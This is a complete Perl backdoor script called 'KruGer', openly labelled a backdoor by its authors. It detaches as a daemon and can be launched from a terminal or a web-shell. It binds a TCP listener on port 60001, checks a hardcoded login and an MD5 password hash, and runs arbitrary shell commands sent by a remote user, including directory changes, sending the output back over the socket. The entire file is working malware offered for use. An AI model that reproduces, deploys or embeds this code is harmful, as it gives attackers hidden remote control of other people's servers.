#!/usr/bin/perl -w
# KruGer - back00r with some features :-)
# Coded by PoizOn <poizon@securityinfo.ru> www: http://securityinfo.ru
# && Satyr <satyr@cyberlords.ru> www: http://cyberlords.ru
# version 1.1   (add "cd" option by Satyr)
# This backdoor work as daemon, and may be run from terminal or web-shell (via browser)
$|=1;
use strict;
use Socket qw(:DEFAULT);
use Digest::MD5 qw(md5_hex);
use POSIX;
### Global Vars ###
my $login="sec";
my $pass="caf9b6b99962bf5c2264824231d7a40c";# ('info' MD5 crypt)
# use: perl -e "use Digest::MD5 qw(md5_hex); print md5_hex('secret')";
# for generate new hash
my $pid_file=".pid";
my $port=60001;# default port
my $timeout=60; # waiting command during this time (in sec)
# ---- just disign :-)
    my $cd_dir = `pwd`;
    chomp $cd_dir;
    
    my $myname=`whoami`;# shell invite ...
    chomp($myname);
    
    my $hostname=`hostname`;
    chomp($hostname);
    
    my $cmd="[$myname\@$hostname $cd_dir] ";#
# -----
###################
## Terminal mode ##
$port=$ARGV[0] if(defined $ARGV[0]);
###################
## Web mode #######
if(defined $ENV{'QUERY_STRING'}) {
    $port=$ENV{'QUERY_STRING'};
    $port=~s/[^0-9]+//;
    $port=60001 if length($port)<3;
    print "Content-Type: text/html\n\n";
}
## show some info
print "Server will be listen $port port\n";# show port
print qq(<br>) if(defined $ENV{'QUERY_STRING'});
print "Now just connect: \$ telnet $hostname $port\n";
## Signals Interception ##
# ^C and kill
$SIG{INT} = $SIG{TERM} = sub { exit_safe() };
# kill -HUP
$SIG{HUP} = sub { exit_safe() };
###########################
## Main ###################
begin_daemon();
server_main();
exit_safe();
###########################
## subroutines ##
sub begin_daemon
{
	my $pid = fork;
	exit if $pid;
		die "Couldn't fork: $!" unless defined($pid);
	# Save PID
	open (F_PID, ">$pid_file") or die "Can't open $pid_file: $!";
	print F_PID "$$\n";
	close F_PID;
	# Reopen standart handle
	#open (*STDERR, "> $com_file") or die "Can't reopen to *STDERR to $com_file: $!";
	for my $handle (*STDIN, *STDOUT)
	{
		open ($handle, "> /dev/null") or die "Can't reopen $handle to /dev/null: $!";
	}
	POSIX::setsid() or die "Can't start a new session: $!";
}

sub exit_safe {
    exit 0;
}

sub server_main {
## open socket ###
    my $protocol=getprotobyname('tcp');
    socket(SOCK,AF_INET,SOCK_STREAM,$protocol) or die "socket() failed: $!\n";
    setsockopt (SOCK,SOL_SOCKET,SO_REUSEADDR,1) or die "Can't set SO_REUSADDR: $!\n";
    my $my_addr=sockaddr_in($port,INADDR_ANY);
    bind(SOCK,$my_addr) or die "bind() failed: $!\n";
    listen(SOCK,SOMAXCONN) or die "listen() failed: $!\n";
    ######  Connect client ##############
    while(1) {
        my($buffer1,$buffer2);
        next unless my $remote_addr=accept(SESSION,SOCK);
        my($rport,$hisaddr)=sockaddr_in($remote_addr);
        my $ip=inet_ntoa($hisaddr);
        syswrite(SESSION,"Login: ");
        # read login
        $buffer1=
        eval {
        local $SIG{ALRM}=sub { die "Time out\n"};
        my $evbuff;
        alarm(10);# таймаут в 4 секунды
        sysread(SESSION,$evbuff,1024);
        return $evbuff;
        };
        alarm(0);
        # закрываем сессию при автоматическом перезапуске вызова
        if ($@ && $@ !~/alarm clock restart/) { close (SESSION); next; }
    ## ok..
    syswrite(SESSION,"Password: ");
        ## read pass
        $buffer2=
        eval {
        local $SIG{ALRM}=sub { die "Time out\n"};
        my $evbuff;
        alarm(4);# таймаут в 4 секунды
        sysread(SESSION,$evbuff,1024);
        return $evbuff;
        };
        alarm(0);
        # закрываем сессию при автоматическом перезапуске вызова
        if ($@ && $@ !~/alarm clock restart/) { close (SESSION); next; }
    ## ok..
## check access
unless(auth_c($buffer1,$buffer2)) {
    syswrite(SESSION,"Permission denied for $buffer1:$buffer2\n"); close(SESSION); next;
}
## go to shell
#SESSION->autoflush(1);

    my $cd_dir_prev;
    my $cd_now;
    my $other;
    
    while(1) {
	my $cmd="[$myname\@$hostname $cd_dir] ";#
	
        syswrite(SESSION,"$cmd ");
        $buffer2=
        eval {
	    local $SIG{ALRM}=sub { die "Time out\n"};
	    my $evbuff;
	    alarm($timeout);#
	    sysread(SESSION,$evbuff,1024);
	    return $evbuff;
        };
        alarm(0);
        # закрываем сессию при автоматическом перезапуске вызова
        if ($@ && $@ !~/alarm clock restart/) { close (SESSION); last; }
        
	$buffer2=~s/\n$//;# clean
        
	if ($buffer2=~/^exit/) {
                        syswrite(SESSION,"Visit SecurityInfo.Ru ;-)\n");
                        close(SESSION);
			last;
	}
        
	# cd support
	
	$buffer2 =~ s/^\s*//;
	$buffer2 =~ s/\s*$//;
	
	if (($cd_now, $other) = $buffer2 =~ /^cd\s*([^;]*)?;?(.*)?/) {
	    
	    $cd_dir_prev = $cd_dir;
	    
	    $cd_dir =~ s/^\s*//;
	    $cd_dir =~ s/\s*$//;
	    
	    if ($cd_now) {
		
		if ($cd_now =~ /^\//) {
		    $cd_dir = $cd_now;
		}
		else {
		    if ($cd_dir =~ /\/$/) {
			$cd_dir .= $cd_now;
		    }
		    else {
			$cd_dir .= "/".$cd_now;    
		    }
		}
		
		{ # checking dir
		    unless (-d $cd_dir or -l $cd_dir) {
			syswrite(SESSION,"No such directory!\n");
			$cd_dir = $cd_dir_prev;
			next;
		    }
		
		#   if (-f $cd_dir) {
		#	syswrite(SESSION,"it's file =)! Can't change directory!\n");
		#	$cd_dir = $cd_dir_prev;
		#	next;
		#   }
		    unless (-x $cd_dir) {
			syswrite(SESSION,"Permission denied\n");
			$cd_dir = $cd_dir_prev;
			next;
		    }
		}
		
		$cd_dir = `cd $cd_dir;pwd`;
		chomp $cd_dir;
		
	    }
	    else {
		if ($ENV{'HOME'}) {
		    $cd_dir = $ENV{'HOME'};
		}
		else {
		    syswrite(SESSION,"no HOME setted for user '".`whoami`."'\n");
		}
	    }
	    
	    if ($other) {
		$buffer2 = $other;
	    }
	    else {
		next;
	    }
        
	}
    
	$buffer2 .= " |";
	
	if ($cd_dir) {
	    open(FILE,"cd $cd_dir; $buffer2") || next;
	}
	else {
	    open(FILE,$buffer2) || next;
	}
	
	while(<FILE>) {
	    syswrite(SESSION,$_);
	}
    
	close(FILE);
    }

}# close 'while' block
close(SOCK);
}


sub auth_c {
    my $name=shift;
    my $secret=shift;
    $name=~s/[\n,\r]+//g;
    $secret=~s/[\n,\r]+//g;
    $secret=md5_hex($secret);
    return 1 if ($login eq $name && $secret eq $pass);
    return 0;
}



 
